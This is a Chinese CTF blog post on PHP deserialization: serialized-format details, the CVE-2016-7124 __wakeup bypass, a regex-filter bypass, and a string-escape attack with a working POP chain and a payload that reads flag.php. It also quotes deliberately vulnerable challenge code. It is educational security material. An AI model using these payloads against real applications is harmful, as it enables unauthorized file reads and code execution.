---
title: PHP反序列化姿势总结
date: 2020-09-25 00:34:08
categories:
  - CTF
---

最近工作室招新，所以又重新捡起了PHP，做了一些反序列化的题目，又学到了一些Tricks，在这里稍微总结一下。

# 序列化字符串中的字母含义

有关序列化字符串中的字母含义，在[这篇文章](https://www.neatstudio.com/show-161-1.shtml)里面已经说的很清楚了（大佬tql，PHP源码都看了一遍），这里稍微再总结一下：

- a - array：数组
- b - boolean：布尔值
- d - double：浮点数
- i - integer：整数
- o - common object：PHP3时被用来代表序列化对象，但是PHP4被O取代
- r - reference：对象引用
- s - non-escaped binary string：无转义字符的字符串
- S - escaped binary string：带有转义字符的字符串
- C - custom object：不知道干啥用的，从来没碰到过
- O - class：普通的类
- N - null：NULL值
- R - pointer reference：指针引用
- U - unicode string：Unicode字符串

<!-- more -->

下面总结一些类型的特点：

1. 整数i：整数的范围为从-2147483648 到 2147483647，若序列化时的数字超出该范围，则直接转换为浮点数；若反序列化时数字超出该范围，则无法得到期望数值。

2. 浮点数d：浮点数可以表示成整数形式、浮点数形式和科学技术法形式，正负无穷大数被序列化时返回`INF`和`-INF`，若反序列化时数字超出PHP的表示范围，也返回`INF`；若反序列化时数字的精度超出PHP的最小精度，则返回0；若序列化时为非数，则返回`NAN`，`NAN`被反序列化时输出为0。

3. 在s、S、O等存在字符串长度的对象中，字符串长度值不能为负数，允许字符串长度的值带有`+`号，如`s:+5:"value";`。

4. S是PHP6新引进的一种字符串序列化方式，它允许字符串以转义字符的情况出现（`\`+字符对应16进制数），如`protected`对象成员名可序列化为`S:5:"\00*\00value";`，其中`\00`即代表`chr(0)`字符（此处必须要两位`\00`，如果使用`\0`会引发Unserialize Error）。

5. 关于对象引用r和指针引用R：

   这两者在引用方式上是有区别的，可以理解为对象引用是一个单边的引用，被赋值的那个变量可以任意修改值，而不会影响到被引用的那个对象；而指针引用则是一个双边的引用，被赋值的那个变量若做了改动，被引用的那个对象也会被修改。也就是说指针引用其实就是两个对象指针指向了同一块内存区域，所以任一指针的数值修改其实都是在对这块内存做修改，也就会影响到另一个指针的值；而对象引用的被赋值对象就像一个临时的指针，指向了被引用对象的内存区域，而当被赋值对象的值修改之后，这个临时指针就指向了另一块内存。下面是两段示例代码：

   ```php
   class SampleClass {
       var $value;
   }
   $a = new SampleClass();
   $a->value = 1;

   $b = new SampleClass();
   $b->value = $a;  // 对象引用

   echo "<pre>";
   var_dump($a);
   var_dump($b);
   $a->value=2;  // 被引用对象的修改
   var_dump($a);
   var_dump($b);
   $b->value=3;  // 被赋值对象的修改
   var_dump($a);
   var_dump($b);
   echo "</pre>";
   ```

   ```php
   class SampleClass {
       var $value;
   }
   $a = new SampleClass();
   $a->value = 1;

   $b = new SampleClass();
   $b->value = $a;  // 对象引用

   echo "<pre>";
   var_dump($a);
   var_dump($b);
   $a->value=2;  // 被引用对象的修改
   var_dump($a);
   var_dump($b);
   $b->value=3;  // 被赋值对象的修改
   var_dump($a);
   var_dump($b);
   echo "</pre>";
   ```

   下面是两端程序输出的差异：

   ![](https://images.hujiekang.top/blogimage-92acc99968dddc6fa7d127d2de4f5d5f-60940b1e.png)

   需要注意的是，对象引用只有在对象序列化时才会产生，对数组和其他标量类型是无法产生的。

6. 对象引用r和指针引用R的引用顺序：

   在序列化时，r或R的后面还会有个数字，这个数字代表的就是引用的顺序。举个例子：

   `O:9:"last_task":3:{s:4:"left";N;s:6:"middle";R:2;s:5:"right";R:2;}`

   可以看见上面这个序列化对象中，left成员为NULL，middle和right都是指针引用，引用后跟着的数字都是2。

   这个数字其实是根据被序列化的顺序来的，上面那篇文章里面说的很明白：

   > 这个`number`简单的说，就是所引用的对象**在序列化串中第一次出现的位置**，但是这个位置不是指字符的位置，而是指对象（这里的对象是泛指所有类型的量，而不仅限于对象类型）的位置。

   上面那个对象，首先被序列化的肯定是整个对象，也就是`last_task`，所以`O:9:"last_task"`的引用序号就是1；随后按顺序序列化它的成员变量，第一个就是`left`，所以它的引用序号就是2；以此类推，若后面两个成员不是引用的话，对应的引用序号也就接着递增。但是当序列化到`middle`时，发现它指向的对象已经被序列化了，也就是`left`，所以给它标上引用序号2；同理`right`也是2。所以实际上，这个对象的三个成员指向的都是同一块内存区域，代表的都是同一个对象。

# 三种类成员变量的序列化方式

我们都知道，面向对象中有三种类型的成员：public、protected和private，代表的是对应成员变量的访问等级。那么PHP的序列化对象中是如何把这三种变量区分开来的呢？直接看示例代码：

```php
class SampleClass {
    public $publicVar;
    protected $protectedVar;
    private $privateVar;

    public function __construct($pub, $pro, $pri)
    {
        $this->publicVar = $pub;
        $this->protectedVar = $pro;
        $this->privateVar = $pri;
    }
}

echo urlencode(serialize(new SampleClass("a", "b", "c")));
```

输出结果如下：

`O%3A11%3A%22SampleClass%22%3A3%3A%7Bs%3A9%3A%22publicVar%22%3Bs%3A1%3A%22a%22%3Bs%3A15%3A%22%00%2A%00protectedVar%22%3Bs%3A1%3A%22b%22%3Bs%3A23%3A%22%00SampleClass%00privateVar%22%3Bs%3A1%3A%22c%22%3B%7D`

去掉一些URL Encode显得更直观一些：

`O:11:"SampleClass":3:{s:9:"publicVar";s:1:"a";s:15:"%00*%00protectedVar";s:1:"b";s:23:"%00SampleClass%00privateVar";s:1:"c";}`

很容易看出，PHP在序列化时对protected和private成员都做了对应的处理：

- protected：变量名前加上`\00*\00`
- private：变量名前加上`\00类名\00`

# 利用方式

## 代表字符串长度的正则绕过

这里使用到了上面说的，字符串长度的值为非负数，允许使用`+`号。下面是一道CTF题的部分代码（[完整题目](/2020/03/19/xctf-wp/#web_php_unserialize)）：

```php
if (isset($_GET['var'])) {
    $var = base64_decode($_GET['var']);
    if (preg_match('/[oc]:\d+:/i', $var)) {
        die('stop hacking!');
    } else {
        @unserialize($var);
    }
} else {
    highlight_file("index.php");
}
```

可以看见这里对序列化字符串做了过滤，即检测到序列化对象即退出程序（`O:1`、`o:1`、`C:1`），这里就可以通过添加`+`号来绕过这个正则表达式。

## `__wakeup()`绕过

这是个老CVE了，[漏洞**CVE**-2016-7124](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124)

具体表现就是在序列化对象中，表示对象属性个数的那个整数的值大于实际对象属性个数时，可以绕过`__wakeup()`的执行。[例题](/2020/03/19/xctf-wp/#unserialize3)

PS：PHP5 < 5.6.25、PHP7 < 7.0.10版本才能生效

## 字符逃逸

这个指的是在某些程序对序列化字符串进行替换，使得序列化字符串中一些对象的长度和表示长度的数字不一致的情况下，可以通过字符串构造使得恶意序列化字符串满足序列化要求。下面是安恒DASCTF四月赛的一道题目：

```php
<?php
show_source("index.php");
function write($data) {
    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
}

function read($data) {
    return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
}

class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this->username = $a;
        $this->password = $b;
    }
}

class B{
    public $b = 'gqy';
    function __destruct(){
        $c = 'a'.$this->b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this->c);
        return 'nice';
    }
}

$a = new A($_GET['a'],$_GET['b']);
//省略了存储序列化数据的过程,下面是取出来并反序列化的操作
$b = unserialize(read(write(serialize($a))));
```

这道题目里面将`read()`和`write()`一起使用，很明显能看出这两个操作会使字符串的长度发生改变。

首先构造POP链，这个还是比较清晰的，通过C类可以读取flag，通过B类中的字符串拼接出发C类中的`__toString()`函数，然后将B类套在A类里面就可以通过程序主逻辑进入：

```php
$b = new B();
$c = new C();
$c->c = "flag.php";
$b->b = $c;
$a = new A("1", $b);
echo serialize($a);
```

上述代码输出如下：

`O:1:"A":2:{s:8:"username";s:1:"1";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}`

因此我们可以把后半段`;s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}`作为`password`的输入，对应输出如下：

<code>O:1:"A":2:{s:8:"username";s:<code style="color:#d2a500">1</code>:"<code style="color:red">1";s:8:"password";s:72:</code>";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}";}</code>

所以我们要做的就是通过控制username字段的长度，使得黄色整数的值与红色字符串的长度相等。

这里就需要利用到`read()`和`write()`了，由于程序是先`write()`再`read()`，所以我们可以只传入`\0\\0\0`使得`write()`不起作用，而`read()`就可以直接将我们输入的字符串长度减半。

最终的Payload：`a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&b=x";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}};s:0:"";s:0:"`（最后添加两个空字符串来闭合多余的双引号）

序列化结果：

<code>O:1:"A":2:{s:8:"username";s:48:"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0<code style="color:red">";s:8:"password";s:86:"x</code>";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}};s:0:"";s:0:"";}</code>

可以看见经过`read()`替换过后，那一组`\0`长度变成了24字节，而后面的字符串（红色部分）也刚好24字节，所以整个一段就满足了总48字节的要求，然后就被当成了`username`的值，也就是产生了逃逸，后面的伪造`password`变量被反序列化执行，就得到了flag。

# 参考链接

- [PHP 序列化（serialize）格式详解](https://www.neatstudio.com/show-161-1.shtml)
- [安恒月赛2020年DASCTF——四月春季战Writeup](https://www.gem-love.com/ctf/2275.html)
- [CVE-2016-7124漏洞复现](https://www.cnblogs.com/zy-king-karl/p/11436872.html)
